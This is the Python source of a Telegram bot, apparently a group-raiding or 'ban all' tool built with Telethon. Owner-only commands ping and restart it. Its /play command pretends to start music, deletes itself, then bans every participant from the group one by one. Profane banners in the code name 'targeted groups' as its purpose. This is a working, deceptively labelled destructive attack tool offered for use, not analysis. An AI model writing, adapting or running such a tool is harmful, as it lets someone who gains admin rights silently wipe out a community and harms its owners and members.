from client import Var
import logging
import re
import os
import sys
import asyncio
from telethon import TelegramClient, events
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)


hero = TelegramClient(None, Var.API_KEY, Var.API_HASH)
hero.start(bot_token=Var.TOKEN)

print("𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗗𝗮𝗿𝗸𝗟𝗶𝗴𝗵𝘁𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗕𝗼𝘁 𝗦𝗲𝗿𝘃𝗲𝗿....") 

"""
𝗣𝗶𝗻𝗴 𝗖𝗼𝗺𝗺𝗮𝗻𝗱.... 
"""

Lund = []
for x in Var.OWNER_ID: 
    Lund.append(x)


@hero.on(events.NewMessage(pattern="^/king"))  
async def ping(e):
    if e.sender_id in Lund:
        start = datetime.now()
        text = "𝗗𝗮𝗿𝗸𝗞𝗶𝗻𝗴𝗛𝗮𝗰𝗸𝗲𝗿...."
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"**𝗜𝗮𝗺 𝗔𝗰𝘁𝗶𝘃𝗲😒\n𝗦𝘁𝗮𝗿𝘁 𝗙𝘂𝗰𝗸𝗶𝗻𝗴 𝗔𝗻𝘆 𝗚𝗿𝗼𝘂𝗽** \n\n **__𝗞𝗶𝗻𝗴😏__** `{ms}` ms")

"""
 𝗥𝗲𝘀𝘁𝗮𝗿𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱.... 
"""
@hero.on(events.NewMessage(pattern="^/restart"))
async def restart(e):
    if e.sender_id in Lund:
        text = "𝗜𝗮𝗺 𝗥𝗲𝗮𝗱𝘆 𝗧𝗼 𝗙𝘂𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗚𝗿𝗼𝘂𝗽𝘀...."
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await hero.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

"""
 𝗕𝗮𝗻𝗔𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱... 
"""
 
@hero.on(events.NewMessage(pattern="^/play"))
async def testing(event):
  if event.sender_id in Lund:
   if not event.is_group:
        Reply = f"𝗡𝗼𝗼𝗯 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗜𝗻 𝗚𝗿𝗼𝘂𝗽..."
        await event.reply(Reply, parse_mode=None, link_preview=None )
   else:
       await event.delete()
       veer = await event.get_chat()
       veerA = await event.client.get_me()
       admin = veer.admin_rights
       creator = veer.creator
       if not admin and not creator:
           await event.reply("𝗜 𝗗𝗼𝗻'𝘁 𝗛𝗮𝘃𝗲 𝗦𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗥𝗶𝗴𝗵𝘁𝘀...")
           return
       await event.reply("**𝗦𝘁𝗮𝗿𝘁𝗲𝗱 𝗠𝘂𝘀𝗶𝗰 𝗜𝗻 𝗧𝗵𝗶𝘀 𝗚𝗿𝗼𝘂𝗽...**")
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == veerA.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.3)


print("𝗟𝗲𝗮𝘃𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗦𝗼𝗼𝗻 𝗖𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗔𝗺 𝗕𝘂𝘀𝘆...") 
print("𝗦𝘁𝗮𝗿𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆...") 
hero.run_until_disconnected()
